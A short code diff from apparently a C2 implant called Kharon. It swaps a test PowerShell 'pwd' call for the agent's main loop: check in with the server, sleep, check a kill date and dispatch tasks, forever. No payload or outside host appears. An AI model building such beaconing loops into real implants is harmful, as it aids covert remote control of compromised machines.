@@ -297,27 +297,25 @@ auto DECLFN Kharon::Start(
 ) -> VOID {
     KhDbgz( "Initializing the principal routine" );
 
-    this->Dot->Pwsh( L"pwd", nullptr );
+    //
+    // do checkin routine (request + validate connection)
+    //
+    this->Tsp->Checkin();
 
-    // //
-    // // do checkin routine (request + validate connection)
-    // //
-    // this->Tsp->Checkin();
+    do {            
+        //
+        // use the wrapper sleep function to run the 
+        //
+        this->Mk->Main( this->Session.SleepTime );
 
-    // do {            
-    //     //
-    //     // use the wrapper sleep function to run the 
-    //     //
-    //     this->Mk->Main( this->Session.SleepTime );
-
-    //     //
-    //     // kill date check and perform routine
-    //     //
-    //     this->Usf->CheckKillDate();
+        //
+        // kill date check and perform routine
+        //
+        this->Usf->CheckKillDate();
    
-    //     //
-    //     // start the dispatcher task routine
-    //     //
-    //     this->Tk->Dispatcher();
-    // } while( 1 );
+        //
+        // start the dispatcher task routine
+        //
+        this->Tk->Dispatcher();
+    } while( 1 );
 }
